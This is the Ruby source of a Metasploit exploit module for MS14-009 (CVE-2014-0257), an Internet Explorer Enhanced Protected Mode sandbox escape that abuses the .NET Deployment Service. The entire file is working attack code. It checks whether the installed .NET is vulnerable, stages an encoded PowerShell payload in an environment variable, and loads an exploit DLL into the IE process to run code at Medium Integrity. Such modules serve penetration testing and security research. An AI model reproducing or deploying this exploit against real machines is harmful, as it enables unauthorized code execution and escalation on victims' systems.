# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/exploit/exe&#039;
require &#039;msf/core/exploit/powershell&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking
 
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::FileInfo
  include Msf::Post::File
 
  NET_VERSIONS = {
    &#039;4.5&#039; => {
      &#039;dfsvc&#039; => &#039;4.0.30319.17929.17&#039;,
      &#039;mscorlib&#039; => &#039;4.0.30319.18063.18&#039;
    },
    &#039;4.5.1&#039; => {
      &#039;dfsvc&#039; => &#039;4.0.30319.18408.18&#039;,
      &#039;mscorlib&#039; => &#039;4.0.30319.18444.18&#039;
    }
  }
 
  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;    => &#039;MS14-009 .NET Deployment Service IE Sandbox Escape&#039;,
      &#039;Description&#039;  => %q{
        This module abuses a process creation policy in the Internet Explorer Sandbox which allows
        to escape the Enhanced Protected Mode and execute code with Medium Integrity. The problem
        exists in the .NET Deployment Service (dfsvc.exe), which can be run as Medium Integrity
        Level. Further interaction with the component allows to escape the Enhanced Protected Mode
        and execute arbitrary code with Medium Integrity.
      },
      &#039;License&#039;  => MSF_LICENSE,
      &#039;Author&#039;  =>
        [
          &#039;James Forshaw&#039;, # Vulnerability Discovery and original exploit code
          &#039;juan vazquez&#039; # metasploit module
        ],
      &#039;Platform&#039;      => [ &#039;win&#039; ],
      &#039;Targets&#039;  =>
        [
          [ &#039;IE 8 - 11&#039;, { } ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 30
        },
      &#039;DisclosureDate&#039;=> "Feb 11 2014",
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2014-0257&#039;],
          [&#039;MSB&#039;, &#039;MS14-009&#039;],
          [&#039;BID&#039;, &#039;65417&#039;],
          [&#039;URL&#039;, &#039;https://github.com/tyranid/IE11SandboxEscapes&#039;]
        ]
    ))
  end
 
  def check
    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe")
      return Exploit::CheckCode::Unknown
    end
 
    net_version = get_net_version
 
    if net_version.empty?
      return Exploit::CheckCode::Unknown
    end
 
    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.dll")
      return Exploit::CheckCode::Detected
    end
 
    mscorlib_version = get_mscorlib_version
 
    if Gem::Version.new(mscorlib_version) >= Gem::Version.new(NET_VERSIONS[net_version]["mscorlib"])
      return Exploit::CheckCode::Safe
    end
 
    Exploit::CheckCode::Vulnerable
  end
 
  def get_net_version
    net_version = ""
 
    dfsvc_version = file_version("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe")
    dfsvc_version = dfsvc_version.join(".")
 
    NET_VERSIONS.each do |k,v|
      if v["dfsvc"] == dfsvc_version
        net_version = k
      end
    end
 
    net_version
  end
 
  def get_mscorlib_version
    mscorlib_version = file_version("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.dll")
    mscorlib_version.join(".")
  end
 
  def exploit
    print_status("Running module against #{sysinfo[&#039;Computer&#039;]}") unless sysinfo.nil?
 
    mod_handle = session.railgun.kernel32.GetModuleHandleA(&#039;iexplore.exe&#039;)
    if mod_handle[&#039;return&#039;] == 0
      fail_with(Failure::NotVulnerable, "Not running inside an Internet Explorer process")
    end
 
    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, "Not running at Low Integrity")
    end
 
    print_status("Searching .NET Deployment Service (dfsvc.exe)...")
 
    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe")
      fail_with(Failure::NotVulnerable, ".NET Deployment Service (dfsvc.exe) not found")
    end
 
    net_version = get_net_version
 
    if net_version.empty?
      fail_with(Failure::NotVulnerable, "This module only targets .NET Deployment Service from .NET 4.5 and .NET 4.5.1")
    end
 
    print_good(".NET Deployment Service from .NET #{net_version} found.")
 
    print_status("Checking if .NET is patched...")
 
    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.dll")
      fail_with(Failure::NotVulnerable, ".NET Installation can not be verified (mscorlib.dll not found)")
    end
 
    mscorlib_version = get_mscorlib_version
 
    if Gem::Version.new(mscorlib_version) >= Gem::Version.new(NET_VERSIONS[net_version]["mscorlib"])
      fail_with(Failure::NotVulnerable, ".NET Installation not vulnerable")
    end
 
    print_good(".NET looks vulnerable, exploiting...")
 
    cmd = cmd_psh_payload(payload.encoded).gsub(&#039;%COMSPEC% /B /C start powershell.exe &#039;,&#039;&#039;).strip
    session.railgun.kernel32.SetEnvironmentVariableA("PSHCMD", cmd)
 
    temp = get_env(&#039;TEMP&#039;)
 
    print_status("Loading Exploit Library...")
 
    session.core.load_library(
        &#039;LibraryFilePath&#039; => ::File.join(Msf::Config.data_directory, "exploits", "CVE-2014-0257", "CVE-2014-0257.dll"),
        &#039;TargetFilePath&#039;  => temp +  "\\CVE-2014-0257.dll",
        &#039;UploadLibrary&#039;   => true,
        &#039;Extension&#039;       => false,
        &#039;SaveToDisk&#039;      => false
    )
  end
 
  def cleanup
    session.railgun.kernel32.SetEnvironmentVariableA("PSHCMD", nil)
    super
  end
 
end

